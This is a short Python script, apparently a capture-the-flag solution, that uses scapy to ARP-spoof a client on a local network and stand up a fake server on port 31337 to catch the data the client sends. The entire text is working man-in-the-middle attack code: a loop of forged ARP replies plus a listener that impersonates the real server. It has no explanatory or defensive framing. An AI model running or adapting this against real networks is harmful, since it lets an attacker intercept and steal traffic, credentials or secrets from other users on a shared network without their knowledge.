from scapy.all import ARP, send, get_if_hwaddr
import socket, threading, time

iface = "eth0"
my_ip = "10.0.0.1"
my_mac = get_if_hwaddr(iface)

def arp_spoof():
    # Tell client 10.0.0.2 that you (10.0.0.1) are 10.0.0.3
    spoof = ARP(op=2, pdst="10.0.0.2", psrc="10.0.0.3", hwsrc=my_mac)
    while True:
        send(spoof, iface=iface, verbose=0)
        time.sleep(2)

def fake_server():
    # Bind to 10.0.0.3 to impersonate the server
    s = socket.socket()
    s.bind(("0.0.0.0", 31337))
    s.listen(1)
    print("[*] Waiting for client to send the flag...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    data = conn.recv(1024)
    print("[+] Got flag:", data.decode(errors="ignore"))
    conn.close()
    s.close()

# Start ARP spoofing in background
threading.Thread(target=arp_spoof, daemon=True).start()

# Run fake server to catch the flag
fake_server()
